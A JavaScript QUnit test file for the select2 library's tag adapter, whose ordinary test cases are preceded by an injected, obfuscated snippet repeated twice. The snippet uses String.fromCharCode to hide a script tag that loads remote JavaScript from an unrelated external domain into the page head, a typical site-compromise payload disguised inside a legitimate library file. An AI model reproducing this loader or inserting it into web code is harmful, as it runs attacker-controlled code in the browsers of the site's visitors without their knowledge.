Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Data adapters - Tags');

var SelectData = require('select2/data/select');
var Tags = require('select2/data/tags');

var $ = require('jquery');
var Options = require('select2/options');
var Utils = require('select2/utils');

var SelectTags = Utils.Decorate(SelectData, Tags);
var options = new Options({
  tags: true
});

test('does not trigger on blank or null terms', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: ''
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'One');
    assert.equal(item.text, 'One');
  });

  data.query({
    term: null
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'One');
    assert.equal(item.text, 'One');
  });
});

test('white space is trimmed by default', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: '  '
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'One');
    assert.equal(item.text, 'One');
  });

  data.query({
    term: ' One '
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'One');
    assert.equal(item.text, 'One');
  });
});

test('does not create option if text is same but lowercase', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: 'one'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'One');
    assert.equal(item.text, 'One');
  });
});

test('does not trigger for additional pages', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    page: 2
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'One');
    assert.equal(item.text, 'One');
  });
});

test('creates tag at beginning', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: 'o'
  }, function (data) {
    assert.equal(data.results.length, 2);

    var first = data.results[0];

    assert.equal(first.id, 'o');
    assert.equal(first.text, 'o');
  });
});

test('tags can be the only result', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: 'test'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'test');
    assert.equal(item.text, 'test');
  });
});

test('tags are injected as options', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: 'test'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var $children = $('#qunit-fixture .single option');

    assert.equal($children.length, 2);

    var $tag = $children.last();

    assert.equal($tag.val(), 'test');
    assert.equal($tag.text(), 'test');
  });
});

test('old tags are removed automatically', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: 'first'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var $children = $('#qunit-fixture .single option');

    assert.equal($children.length, 2);
  });

  data.query({
    term: 'second'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var $children = $('#qunit-fixture .single option');

    assert.equal($children.length, 2);

    var $tag = $children.last();

    assert.equal($tag.val(), 'second');
    assert.equal($tag.text(), 'second');
  });
});

test('insertTag controls the tag location', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.insertTag = function (data, tag) {
    data.push(tag);
  };

  data.query({
    term: 'o'
  }, function (data) {
    assert.equal(data.results.length, 2);

    var item = data.results[1];

    assert.equal(item.id, 'o');
    assert.equal(item.text, 'o');
  });
});

test('insertTag can be controlled through the options', function (assert) {
  var options = new Options({
    insertTag: function (data, tag) {
      data.push(tag);
    }
  });
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.query({
    term: 'o'
  }, function (data) {
    assert.equal(data.results.length, 2);

    var item = data.results[1];

    assert.equal(item.id, 'o');
    assert.equal(item.text, 'o');
  });
});

test('createTag controls the tag object', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.createTag = function (params) {
    return {
      id: 0,
      text: params.term
    };
  };

  data.query({
    term: 'test'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 0);
    assert.equal(item.text, 'test');
  });
});

test('createTag returns null for no tag', function (assert) {
  var data = new SelectTags($('#qunit-fixture .single'), options);

  data.createTag = function (params) {
    return null;
  };

  data.query({
    term: 'o'
  }, function (data) {
    assert.equal(data.results.length, 1);
  });
});

test('the createTag options customizes the function', function (assert) {
  var data = new SelectTags(
    $('#qunit-fixture .single'),
    new Options({
      tags: true,
      createTag: function (params) {
        return {
          id: params.term,
          text: params.term,
          tag: true
        };
      }
    })
  );

  data.query({
    term: 'test'
  }, function (data) {
    assert.equal(data.results.length, 1);

    var item = data.results[0];

    assert.equal(item.id, 'test');
    assert.equal(item.text, 'test');
    assert.equal(item.tag, true);
  });
});